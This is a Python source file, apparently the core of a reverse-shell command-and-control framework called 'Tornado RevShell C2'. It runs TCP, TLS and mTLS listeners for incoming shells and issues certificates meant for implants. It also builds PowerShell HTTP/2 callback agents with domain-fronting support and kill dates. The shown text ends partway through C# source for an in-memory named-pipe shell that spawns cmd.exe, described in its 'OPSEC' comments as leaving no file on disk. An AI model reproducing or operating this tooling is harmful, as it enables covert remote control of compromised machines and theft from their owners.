import argparse
import base64
import datetime
import hashlib
import os
import re
import random
import select
import socket
import ssl
import subprocess
import sys
import threading
import time
from threading import Lock

from .win_client import (
    infer_type_from_sysinfo,
    make_probe_markers,
    probe_windows_platform,
    send_powershell_script,
    text_suggests_windows,
)

from .http2_transport import (
    HTTP2_AGENT_TEMPLATE as _HTTP2_AGENT_TEMPLATE,
    HTTP2_AGENT_LINUX_PY as _HTTP2_AGENT_LINUX_PY,
    HTTP1_AGENT_PS as _HTTP1_AGENT_PS,
)

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

from .constants import (
    CHUNK_SIZE,
    CLIENT_COMMANDS,
    ID_COMMANDS,
    IDENT_MARK_END,
    IDENT_MARK_START,
    INMEMORY_FILETYPES,
    MAIN_COMMANDS,
    SYSINFO_MARK_END,
    XFER_MARK_END,
    XFER_MARK_START,
)
from .export import SessionExporter
from .payloads import get_payloads
from .plugins.shared.inmemory import InMemoryExecutor
from .session_log import SessionLogger
from .session_registry import SessionRegistry, _norm_machine_id, compute_fingerprint
from .terminal_sanitize import strip_csi_sequences, sanitize_terminal_output
from .sysinfo import (
    build_collect_commands,
    extract_sysinfo,
    format_sysinfo,
)
from .terminal import TerminalManager
from .transfer import FileTransfer
from .tunnel import TunnelManager
from .updater import Updater
from .plugins import PluginManager
from .http2_transport import Http2Listener
try:
    from .smb_transport import SmbPipeSessionSocket
    _SMB_AVAILABLE = True
    _SMB_IMPORT_ERROR = None
except ImportError as _e:
    SmbPipeSessionSocket = None
    _SMB_AVAILABLE = False
    _SMB_IMPORT_ERROR = str(_e)
import secrets


def _detect_mtls(client_sock):
    if not isinstance(client_sock, ssl.SSLSocket):
        return False
    try:
        return bool(client_sock.getpeercert())
    except Exception:
        return False

class TORNADOREVC2:
    def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, mtls_port=9443,
                 h2_port=None,
                 certfile=os.path.join('tls_certs', 'server.pem'),
                 keyfile=os.path.join('tls_certs', 'server.key'),
                 mtls_ca_cert=os.path.join('mtls_certs', 'ca.pem'),
                 mtls_ca_key=os.path.join('mtls_certs', 'ca.key'),
                 mtls_server_cert=os.path.join('mtls_certs', 'server-mtls.pem'),
                 mtls_server_key=os.path.join('mtls_certs', 'server-mtls.key'),
                 mtls_client_cert=os.path.join('mtls_certs', 'client.pem'),
                 mtls_client_key=os.path.join('mtls_certs', 'client.key')):
        self.host = host
        self.revshell_port = revshell_port
        self.tls_port = tls_port
        self.mtls_port = mtls_port
        self.h2_port = h2_port
        # token -> primary shell socket, populated by http2switch and
        # consumed by attach_http2_transport().
        self._h2_pending = {}
        self.certfile = certfile
        self.keyfile = keyfile
        self.mtls_ca_cert = mtls_ca_cert
        self.mtls_ca_key = mtls_ca_key
        self.mtls_server_cert = mtls_server_cert
        self.mtls_server_key = mtls_server_key
        self.mtls_client_cert = mtls_client_cert
        self.mtls_client_key = mtls_client_key
        self.tls_cert_dir = os.path.dirname(certfile) or '.'
        self.mtls_cert_dir = os.path.dirname(mtls_ca_cert) or '.'
        self.revshell_clients = {}
        self.client_counter = 0
        self.running = False
        self.current_client = None
        self.client_lock = Lock()
        self.transfer = FileTransfer(self)
        self.inmemory = InMemoryExecutor(self)
        self.tunnels = TunnelManager(self)
        self.exporter = SessionExporter(self)
        self.registry = SessionRegistry()
        self.plugins = PluginManager(self)
        self.updater = Updater(self)
        self._tcp_server = None
        self._tls_server = None
        self._mtls_server = None
        self._h2_listener = None
        self.colors = {
            'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
            'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
        }
        self.payloads = self._build_payloads()
        self._h2_hmac_secret = secrets.token_bytes(32)
        self._launch_marker = "L" + secrets.token_hex(6)
        self._front_domain = None
        self._front_port   = 443
        self._smb_pending = {}

    def _build_payloads(self):
        return get_payloads(self.host, self.revshell_port, self.tls_port, self.mtls_port)

    def print_banner(self):
        banner = f"""
{self.colors['cyan']}{self.colors['bold']}
████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
   ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 

      T O R N A D O   R E V S H E L L   C 2  -  kamalx06
{self.colors['end']}
"""
        print(banner)
        active = self.get_client_count()
        print(
            f"{self.colors['green']}Listeners:{self.colors['end']}\n"
            f"  {self.colors['cyan']}TCP{self.colors['end']} {self.host}:{self.revshell_port}\n"
            f"  {self.colors['cyan']}TLS{self.colors['end']} {self.host}:{self.tls_port}\n"
            f"  {self.colors['cyan']}MTLS{self.colors['end']} {self.host}:{self.mtls_port}\n"
            f"{self.colors['green']}Active Sessions:{self.colors['end']} {active}\n"
        )

    def get_client_count(self):
        with self.client_lock:
            seen  = set()
            alive = 0
            for sock, info in list(self.revshell_clients.items()):
                try:
                    if sock.fileno() == -1:
                        continue
                except Exception:
                    continue
                sid = info.get('id')
                if sid is None or sid in seen:
                    continue
                seen.add(sid)
                alive += 1
            return alive

    def _client_info(self, client_sock):
        with self.client_lock:
            return self.revshell_clients.get(client_sock)

    def _get_session_logger(self, client_sock):
        info = self._client_info(client_sock)
        return info.get('logger') if info else None

    def _make_session_id(self, client_id, addr, shell_type, sysinfo=None):
        ip = addr[0]
        logtime = datetime.datetime.now().strftime('%d-%m-%Y_%H%M%S')
        hostname = (sysinfo or {}).get('hostname', 'unknown')
        username = (sysinfo or {}).get('username', 'unknown')
        return f"{client_id:03d}_{username}@{hostname}_{ip}_{shell_type}_{logtime}"

    def _init_readline(self):
        if not readline:
            return
        self._completer_mode = 'main'
        self._completion_matches = []
        try:
            if 'libedit' in (readline.__doc__ or ''):
                readline.parse_and_bind('bind ^I rl_complete')
            else:
                readline.parse_and_bind('tab: complete')
        except Exception:
            pass
        readline.set_completer_delims(' \t\n')
        readline.set_history_length(1000)
        readline.set_completer(self._readline_complete)

    def _set_completer_mode(self, mode):
        if readline:
            self._completer_mode = mode

    def _readline_complete(self, text, state):
        if state == 0:
            self._completion_matches = self._completion_candidates(text)
        try:
            return self._completion_matches[state]
        except IndexError:
            return None

    def _completion_arg_index(self):
        line = readline.get_line_buffer()
        begidx = readline.get_begidx()
        prefix = line[:begidx]
        ends_space = prefix.endswith(' ') or prefix.endswith('\t')
        words = prefix.split()
        if not words:
            return 0
        if ends_space:
            return len(words)
        return len(words) - 1

    def _get_client_ids(self):
        ids    = set()
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                try:
                    if sock.fileno() != -1:
                        ids.add(str(info['id']))
                except Exception:
                    pass
        return sorted(ids)

    def _complete_paths(self, text):
        raw = os.path.expanduser(text or '')
        if raw.endswith(os.sep) or raw.endswith('/'):
            dirname, basename = raw, ''
        else:
            dirname, basename = os.path.split(raw)
        if not dirname:
            dirname = '.'
        if not os.path.isdir(dirname):
            return []
        matches = []
        try:
            for entry in sorted(os.listdir(dirname)):
                if entry.startswith(basename):
                    full = os.path.join(dirname, entry)
                    if os.path.isdir(full):
                        matches.append(full + os.sep)
                    else:
                        matches.append(full)
        except OSError:
            return []
        return matches

    def _completion_candidates(self, text):
        if not readline:
            return []
        arg_i = self._completion_arg_index()
        words = readline.get_line_buffer().split()
        cmd = words[0].lower() if words else ''
        mode = getattr(self, '_completer_mode', 'main')
        session_sock = self.current_client if mode == 'client' else None
        if mode == 'client':
            if arg_i == 0:
                return sorted(c for c in CLIENT_COMMANDS if c.startswith(text.lower()))
            if cmd == 'upload' and arg_i == 1:
                return self._complete_paths(text)
            if cmd == 'download' and arg_i == 2:
                return self._complete_paths(text)
            if cmd == 'run' and arg_i == 1:
                return sorted(p for p in self.plugins.completion_plugins(session_sock) if p.startswith(text.lower()))
            if cmd == 'run' and arg_i == 2 and words[1].lower() == 'inmemory':
                return sorted(t for t in INMEMORY_FILETYPES if t.startswith(text.lower()))
            if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
                return self._complete_paths(text)
            if cmd == 'plugins' and arg_i == 1:
                subs = ('list', 'load', 'unload', 'reload', 'rescan', 'info', 'help')
                return sorted(s for s in subs if s.startswith(text.lower()))
            if cmd == 'plugins' and arg_i == 2 and words[1].lower() in ('load', 'unload', 'reload', 'info'):
                return sorted(p for p in self.plugins.completion_plugins(session_sock) if p.startswith(text.lower()))
            return []
        if arg_i == 0:
            return sorted(c for c in MAIN_COMMANDS if c.startswith(text.lower()))
        if arg_i == 1 and cmd in ID_COMMANDS:
            return sorted(i for i in self._get_client_ids() if i.startswith(text))
        if cmd == 'run' and arg_i == 1:
            return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
        if cmd == 'run' and arg_i == 2:
            return sorted(i for i in self._get_client_ids() if i.startswith(text))
        if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
            return sorted(t for t in INMEMORY_FILETYPES if t.startswith(text.lower()))
        if cmd == 'run' and arg_i == 4 and words[1].lower() == 'inmemory':
            return self._complete_paths(text)
        if cmd == 'plugins' and arg_i == 1:
            subs = ('list', 'load', 'unload', 'reload', 'rescan', 'info', 'help')
            return sorted(s for s in subs if s.startswith(text.lower()))
        if cmd == 'plugins' and arg_i == 2 and words[1].lower() in ('load', 'unload', 'reload', 'info'):
            return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
        if cmd == 'upload' and arg_i == 2:
            return self._complete_paths(text)
        if cmd == 'download' and arg_i == 3:
            return self._complete_paths(text)
        return []

    def print_payloads(self):
        for category, payloads in self.payloads.items():
            print(f"{self.colors['bold']}{category}:{self.colors['end']}")
            note = payloads.get('__note__')
            if note:
                print(f"  {self.colors['yellow']}NOTE:{self.colors['end']} {note}\n")
            for name, payload in payloads.items():
                if name == '__note__':
                    continue
                print(f"  {self.colors['green']}{name}{self.colors['end']} {self.colors['yellow']}{payload}")
            print()

    def _openssl_executable(self):
        return 'openssl.exe' if os.name == 'nt' else 'openssl'

    def ensure_tls_certificates(self):
        if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
            return

        self._ensure_dir_for(self.certfile)
        self._ensure_dir_for(self.keyfile)

        openssl = self._openssl_executable()
        cmd = [
            openssl, 'req', '-x509', '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-days', '3650',
            '-keyout', self.keyfile,
            '-out', self.certfile,
            '-subj', '/CN=localhost',
        ]
        print(
            f"\n{self.colors['yellow']}{self.colors['bold']}[TLS]{self.colors['end']} "
            f"{self.colors['yellow']}No TLS certificate found — generating a new self-signed pair."
            f"{self.colors['end']}"
        )
        print(f"  {self.colors['cyan']}→{self.colors['end']} Certificate : {self.certfile}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Private key : {self.keyfile}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Validity    : 3650 days (10 years)")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Subject     : CN=localhost")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        except FileNotFoundError:
            print(
                f"{self.colors['red']}[TLS] Failed: {openssl} not found on PATH. "
                f"Install OpenSSL and try again.{self.colors['end']}"
            )
            sys.exit(1)

        if result.returncode != 0:
            detail = (result.stderr or result.stdout or 'unknown error').strip()
            print(f"{self.colors['red']}[TLS] Certificate generation failed:{self.colors['end']}")
            if detail:
                print(f"  {detail}")
            sys.exit(1)

        print(
            f"{self.colors['green']}[TLS] Certificate generated successfully."
            f"{self.colors['end']}\n"
        )

    def create_tls_context(self):
        if not os.path.exists(self.certfile):
            raise FileNotFoundError(f"Certificate not found: {self.certfile}")
        if not os.path.exists(self.keyfile):
            raise FileNotFoundError(f"Key not found: {self.keyfile}")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        # Prefer TLS 1.3 when both ends support it; the min stays at 1.2
        # so older clients still negotiate. No behavior change on targets
        # that only speak 1.2.
        try:
            context.maximum_version = ssl.TLSVersion.TLSv1_3
        except AttributeError:
            pass
        context.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        context.options |= ssl.OP_NO_COMPRESSION
        context.options |= ssl.OP_NO_RENEGOTIATION
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        # Enable TLS session tickets — this allows clients to resume
        # sessions across reconnects, matching the behaviour of real
        # browsers. If the runtime does not expose OP_NO_TICKET,
        # tickets are already on by default.
        try:
            context.options &= ~ssl.OP_NO_TICKET
        except Exception:
            pass
        try:
            context.num_tickets = 4
        except Exception:
            pass
        try:
            context.set_ecdh_curve("X25519")
        except ssl.SSLError:
            context.set_ecdh_curve("prime256v1")
        return context

    @staticmethod
    def _ensure_dir_for(path):
        d = os.path.dirname(path)
        if d:
            os.makedirs(d, exist_ok=True)

    def _run_openssl(self, cmd, label):
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        except FileNotFoundError:
            print(
                f"{self.colors['red']}Failed to run "
                f"{self._openssl_executable()}: not found on PATH.{self.colors['end']}"
            )
            sys.exit(1)
        if result.returncode != 0:
            detail = (result.stderr or result.stdout or 'unknown error').strip()
            print(f"{self.colors['red']}{label} failed:{self.colors['end']}")
            if detail:
                print(detail)
            sys.exit(1)

    def ensure_mtls_certificates(self):
        needed = [
            self.mtls_ca_cert, self.mtls_ca_key,
            self.mtls_server_cert, self.mtls_server_key,
            self.mtls_client_cert, self.mtls_client_key,
        ]
        if all(os.path.exists(p) for p in needed):
            return

        self._ensure_dir_for(self.mtls_ca_cert)

        openssl = self._openssl_executable()
        print(
            f"\n{self.colors['yellow']}{self.colors['bold']}[mTLS]{self.colors['end']} "
            f"{self.colors['yellow']}mTLS material missing — bootstrapping a fresh PKI."
            f"{self.colors['end']}"
        )
        print(f"  {self.colors['cyan']}→{self.colors['end']} Output dir   : {self.mtls_cert_dir}{os.sep}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} CA           : 4096-bit RSA, valid 3650 days")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Server cert  : CN=localhost, signed by CA")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Client cert  : CN=tornado-client, signed by CA")
        print(f"  {self.colors['cyan']}→{self.colors['end']} Client bundle: ship client.pem + client.key + ca.pem to the implant")

        self._run_openssl([
            openssl, 'req', '-x509', '-newkey', 'rsa:4096', '-sha256', '-nodes',
            '-days', '3650',
            '-keyout', self.mtls_ca_key,
            '-out',    self.mtls_ca_cert,
            '-subj',   '/CN=TornadoRevC2-mTLS-CA',
        ], 'CA generation')

        server_csr = self.mtls_server_cert + '.csr'
        client_csr = self.mtls_client_cert + '.csr'

        self._run_openssl([
            openssl, 'req', '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-keyout', self.mtls_server_key,
            '-out',    server_csr,
            '-subj',   '/CN=localhost',
        ], 'Server CSR generation')

        self._run_openssl([
            openssl, 'x509', '-req', '-in', server_csr,
            '-CA', self.mtls_ca_cert, '-CAkey', self.mtls_ca_key, '-CAcreateserial',
            '-out', self.mtls_server_cert, '-days', '3650', '-sha256',
        ], 'Server certificate signing')

        self._run_openssl([
            openssl, 'req', '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-keyout', self.mtls_client_key,
            '-out',    client_csr,
            '-subj',   '/CN=tornado-client',
        ], 'Client CSR generation')

        self._run_openssl([
            openssl, 'x509', '-req', '-in', client_csr,
            '-CA', self.mtls_ca_cert, '-CAkey', self.mtls_ca_key, '-CAcreateserial',
            '-out', self.mtls_client_cert, '-days', '3650', '-sha256',
        ], 'Client certificate signing')

        for csr in (server_csr, client_csr):
            try:
                os.remove(csr)
            except OSError:
                pass

        print(f"{self.colors['green']}[mTLS] PKI initialized successfully.{self.colors['end']}")

    def create_mtls_context(self):
        for path in (self.mtls_server_cert, self.mtls_server_key, self.mtls_ca_cert):
            if not os.path.exists(path):
                raise FileNotFoundError(f"mTLS file not found: {path}")

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.mtls_server_cert, keyfile=self.mtls_server_key)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = False
        context.load_verify_locations(cafile=self.mtls_ca_cert)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        try:
            context.maximum_version = ssl.TLSVersion.TLSv1_3
        except AttributeError:
            pass
        context.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        context.options |= ssl.OP_NO_COMPRESSION
        context.options |= ssl.OP_NO_RENEGOTIATION
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        try:
            context.set_ecdh_curve("X25519")
        except ssl.SSLError:
            context.set_ecdh_curve("prime256v1")
        return context

    def send_to_revshell(self, client_sock, cmd):
        try:
            client_sock.sendall((cmd + "\n").encode())
        except Exception as exc:
            if self._is_secondary_transport(client_sock):
                print(f"{self.colors['yellow']}[transport] send failed on "
                      f"secondary transport: {type(exc).__name__}: {exc}"
                      f"{self.colors['end']}")
                # A transport whose sendall() has marked itself closed
                # is not coming back. SMB has no reconnection logic, and
                # HTTP/2 marks itself closed only on fatal send failures.
                # Clean up so `transport <ID>` reflects reality.
                if getattr(client_sock, 'closed', False):
                    try:
                        self.cleanup_client(client_sock)
                    except Exception:
                        pass
                return False
            self.cleanup_client(client_sock)
            return False

        # Record which transport handled this send, so `transport <ID>` and
        # the session log show the truth, not just the handler's intent.
        info = self._client_info(client_sock)
        if info is not None:
            transports = info.get('transports') or {}
            if transports.get('shell') is client_sock:
                label = 'shell'
            elif transports.get('http2') is client_sock:
                label = 'http2'
            elif transports.get('smb') is client_sock:
                label = 'smb'
            else:
                label = 'unknown'
            info['last_send_via'] = label
            try:
                info['last_send_addr'] = client_sock.getpeername()
            except Exception:
                info['last_send_addr'] = None
            logger = info.get('logger')
            if logger and label in ('shell', 'http2', 'smb'):
                try:
                    logger.log_event(
                        f"cmd[{label}] {cmd[:120]}{'…' if len(cmd) > 120 else ''}"
                    )
                except Exception:
                    pass
        return True

    def _is_secondary_transport(self, client_sock):
        """True if client_sock is not the primary shell socket."""
        info = self._client_info(client_sock)
        if not info:
            return False
        tr = info.get('transports') or {}
        if tr.get('http2') is client_sock:
            return True
        if tr.get('shell') is not client_sock:
            return True
        return False

    def recv_output(self, client_sock, timeout=1.0, until_marker=None):
        data = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                r, _, _ = select.select([client_sock], [], [], min(0.5, remaining))
                if not r:
                    if until_marker:
                        continue
                    break
                chunk = client_sock.recv(65536)
                if not chunk:
                    # Never tear down a secondary transport from here — the
                    # HTTP listener owns its lifecycle (StreamEnded /
                    # StreamReset / connection teardown). A transient empty
                    # read on a socketpair is not a session disconnect.
                    if not self._is_secondary_transport(client_sock):
                        self.cleanup_client(client_sock)
                    return ""
                data += chunk
                if until_marker and until_marker.encode() in data:
                    deadline = time.time() + 1.5
                    continue
                if not until_marker:
                    deadline = min(deadline, time.time() + 0.3)
            except Exception:
                # Same rule: only the primary shell is cleaned up here.
                # Secondary transports are torn down by the listener.
                if not self._is_secondary_transport(client_sock):
                    self.cleanup_client(client_sock)
                return ""
        return data.decode(errors="ignore")

    def _format_size(self, nbytes):
        for unit in ('B', 'KB', 'MB', 'GB'):
            if nbytes < 1024 or unit == 'GB':
                if unit == 'B':
                    return f"{nbytes} B"
                return f"{nbytes:.1f} {unit}"
            nbytes /= 1024

    def _print_progress(self, transferred, total, start_time, label='Transfer'):
        if total <= 0:
            pct, filled, bar_width = 100, 30, 30
        else:
            pct = transferred / total * 100
            bar_width = 30
            filled = int(bar_width * transferred / total)
        bar = '█' * filled + '░' * (bar_width - filled)
        elapsed = max(time.time() - start_time, 0.001)
        rate = transferred / elapsed
        eta = (total - transferred) / rate if rate > 0 and total > transferred else 0
        line = (
            f"\r{self.colors['cyan']}{label} [{bar}] {pct:5.1f}% "
            f"({self._format_size(transferred)}/{self._format_size(total)}) "
            f"{self._format_size(rate)}/s ETA:{eta:4.0f}s{self.colors['end']}"
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def _sha256_file(self, path):
        h = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                block = f.read(1024 * 1024)
                if not block:
                    break
                h.update(block)
        return h.hexdigest()

    def _strip_ansi(self, text):
        return strip_csi_sequences(text)

    def _normalize_remote_path(self, path, shell_type):
        path = path.strip().strip('"').strip("'")
        if shell_type == 'windows':
            return path.replace('/', '\\')
        return path.replace('\\', '/')

    def _escape_path(self, path, shell_type):
        path = self._normalize_remote_path(path, shell_type)
        if shell_type == 'windows':
            return path.replace("'", "''")
        return path.replace("'", "'\\''")

    _WIN_PS_CMD_LIMIT = 8190

    def _max_win_inline_chunk(self, remote_path, truncate=False):
        """Largest raw payload that fits in one inline PowerShell write command."""
        path = self._escape_path(remote_path, 'windows')
        mode = 'Create' if truncate else 'Append'
        template = (
            f"$d=[Convert]::FromBase64String('');"
            f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
            f"$fs.Write($d,0,$d.Length);$fs.Close();"
            f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
        )
        overhead = len(f'powershell -NoProfile -Command "{template}"')
        available = self._WIN_PS_CMD_LIMIT - overhead
        if available <= 0:
            return CHUNK_SIZE['windows']
        return max(1024, int(available * 3 / 4))

    def _write_chunk_size(self, remote_path, shell_type, truncate=False):
        base = CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
        if shell_type == 'windows':
            return min(base, self._max_win_inline_chunk(remote_path, truncate=truncate))
        return base

    def _win_ps_cmd(self, script):
        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
        cmd = f"powershell -NoProfile -EncodedCommand {encoded}"
        if len(cmd) <= self._WIN_PS_CMD_LIMIT:
            return cmd
        return None

    def _send_win_ps(self, client_sock, script, stage_timeout=3.0):
        """Deliver a PowerShell script, chunking via the interactive shell when needed."""
        return send_powershell_script(self, client_sock, script, stage_timeout=stage_timeout)

    def _win_ps_inline(self, script):
        escaped = script.replace('"', '`"')
        return f'powershell -NoProfile -Command "{escaped}"'

    def _flush_shell(self, client_sock, timeout=0.8):
        end = time.time() + timeout
        while time.time() < end:
            try:
                r, _, _ = select.select([client_sock], [], [], min(0.15, end - time.time()))
                if not r:
                    break
                if not client_sock.recv(65536):
                    # Only clean up the primary shell here. Secondary
                    # transports are torn down by the HTTP listener
                    # itself (StreamEnded / connection teardown).
                    info = self._client_info(client_sock)
                    is_secondary = False
                    if info:
                        tr = info.get('transports') or {}
                        if tr.get('http2') is client_sock:
                            is_secondary = True
                        elif tr.get('shell') is not client_sock:
                            is_secondary = True
                    if not is_secondary:
                        self.cleanup_client(client_sock)
                    break
            except Exception:
                break

    def _extract_marked(self, output, start_mark=None, end_mark=None, strip_ws=True):
        start_mark = start_mark or XFER_MARK_START
        end_mark = end_mark or XFER_MARK_END
        output = self._strip_ansi(output)
        start = output.rfind(start_mark)
        if start == -1:
            return None
        end = output.find(end_mark, start + len(start_mark))
        if end == -1:
            return None
        payload = output[start + len(start_mark):end]
        if strip_ws:
            payload = re.sub(r'[\r\n\t ]', '', payload)
        else:
            payload = payload.strip('\r\n\t ')
        return payload if payload else ''

    def _parse_marked_int(self, payload):
        if payload is None:
            return None
        match = re.search(r'\d+', payload)
        return int(match.group()) if match else None

    def _parse_marked_hash(self, payload):
        if payload is None:
            return None
        match = re.search(r'[a-fA-F0-9]{64}', payload)
        return match.group().lower() if match else None

    def _run_marked(
        self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0,
        start_mark=None, end_mark=None, strip_ws=True,
    ):
        start_mark = start_mark or XFER_MARK_START
        end_mark = end_mark or XFER_MARK_END
        if shell_type == 'unknown':
            shell_type = self.resolve_shell_type(client_sock)
        self._flush_shell(client_sock)
        if shell_type == 'windows':
            if not self._send_win_ps(client_sock, win_ps_script):
                return None
        elif not self.send_to_revshell(client_sock, unix_cmd):
            return None
        output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
        payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
        if payload is None and output and end_mark in output:
            output += self.recv_output(client_sock, timeout=min(3.0, timeout), until_marker=end_mark)
            payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
        if payload is not None and shell_type in ('windows', 'unix'):
            self._pin_shell_type(client_sock, shell_type)
        return payload

    def _get_client_by_id(self, client_id):
        """
        Return the active transport socket for a logical session.

        Candidates are tried in order:
        1. the transport marked active_transport, if its fileno is valid
        2. the other secondary transport, if it is still alive
        3. the primary shell socket, if it is still alive
        The first candidate with a valid fileno wins.
        """
        info = None
        with self.client_lock:
            for _sock, cand in self.revshell_clients.items():
                if cand.get('id') == client_id:
                    info = cand
                    break
        if info is None:
            return None

        active     = info.get('active_transport', 'shell')
        transports = dict(info.get('transports') or {})
        primary    = info.get('sock')

        candidates = []
        t = transports.get(active)
        if t is not None:
            candidates.append(t)
        for key in ('shell', 'http2', 'smb'):
            t = transports.get(key)
            if t is not None and t not in candidates:
                candidates.append(t)
        if primary is not None and primary not in candidates:
            candidates.append(primary)

        for t in candidates:
            try:
                if t.fileno() != -1:
                    return t
            except Exception:
                continue
        return None

    def attach_http2_transport(self, bridge, addr, token):
        """Called by Http2Listener when a new /c2/<token> stream arrives."""
        with self.client_lock:
            primary_sock = self._h2_pending.pop(token, None)
        if primary_sock is None:
            try:
                bridge.close()
            except Exception:
                pass
            print(
                f"{self.colors['yellow']}[H2] Unknown token {token!r} — "
                f"stream rejected{self.colors['end']}"
            )
            return

        info = self._client_info(primary_sock)
        if info is None:
            try:
                bridge.close()
            except Exception:
                pass
            return

        # Register the bridge under the same info dict so lookups work.
        info['transports']['http2'] = bridge
        info['active_transport']    = 'http2'
        info['h2_token']            = None
        with self.client_lock:
            self.revshell_clients[bridge] = info

        display = info['name'] if info.get('name') else f"#{info['id']}"
        print(
            f"{self.colors['green']}[H2] HTTP/2 transport attached to "
            f"{display} from {addr[0]}:{addr[1]} — active transport is now "
            f"http2{self.colors['end']}"
        )
        logger = info.get('logger')
        if logger:
            logger.log_event(f"HTTP/2 transport attached from {addr[0]}:{addr[1]}")

    def _h2_token_hmac(self, token):
        """Return a hex HMAC over the token, using the handler's per-run key."""
        import hmac as _hmac
        return _hmac.new(
            self._h2_hmac_secret, token.encode('ascii'), hashlib.sha256,
        ).hexdigest()

    def _h2_verify_token(self, token, presented):
        """Constant-time HMAC compare for a presented token proof."""
        import hmac as _hmac
        expected = self._h2_token_hmac(token)
        try:
            return _hmac.compare_digest(expected, presented)
        except Exception:
            return False

    def _build_h2_url(self, host, port, token, front_domain=None,
                      front_port=None):
        """
        Build the HTTP/2 callback URL the agent will dial.

        If `front_domain` is set, the agent's SNI, Host header, and outbound
        connection all point at the fronting infrastructure — the real
        handler is reached via the redirector's routing rules. Otherwise the
        URL is a direct HTTPS callback.

        The HMAC proof is appended as ?s=<hex>. The agent must echo it in
        the path, and the server verifies it before attaching the stream.
        """
        proof = self._h2_token_hmac(token)
        path  = f"/c2/{token}?s={proof}"

        if front_domain:
            # Agent dials the front domain. Port 443 by default. The
            # redirector is responsible for routing this path to our
            # real listener.
            effective_port = front_port or 443
            if effective_port == 443:
                return f"https://{front_domain}{path}"
            return f"https://{front_domain}:{effective_port}{path}"

        return f"https://{host}:{port}{path}"

    def _http2_payload(self, url):
        """Return the PowerShell source for the target-side HTTP/2 agent."""
        try:
            kill_days = int(os.environ.get('TORNADO_KILL_DAYS', '30'))
        except Exception:
            kill_days = 30
        kill_deadline = int(time.time()) + kill_days * 86400
        return (
            _HTTP2_AGENT_TEMPLATE
            .replace('__H2_URL__', url)
            .replace('__H2_KILL__', str(kill_deadline))
        )

    def _smb_payload(self, pipe_name):
        """
        Return the C# source for a target-side named-pipe server.

        The server:
          - Creates NamedPipeServerStream(pipe_name) with a permissive
            DACL so any authenticated user can connect.
          - Spawns cmd.exe with redirected stdio.
          - Reads length-prefixed frames from the pipe, writes them to
            the shell's stdin.
          - Reads shell stdout/stderr, writes them back as length-prefixed
            frames.

        OPSEC: the pipe name is randomised by the caller. The C# is
        compiled in memory via Add-Type — no file on disk.
        """
        return f'''
using System;
using System.IO;
using System.IO.Pipes;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.Security.Principal;

public static class SmbShell {{
    public static void Run(string pipeName) {{
        // Explicit DACL: allow any authenticated SMB session to open the
        // pipe. Without this, the default DACL only grants FullControl to
        // the shell's user, and the handler — connecting as a different
        // account — is rejected with STATUS_ACCESS_DENIED.
        var security = new PipeSecurity();
        security.AddAccessRule(new PipeAccessRule(
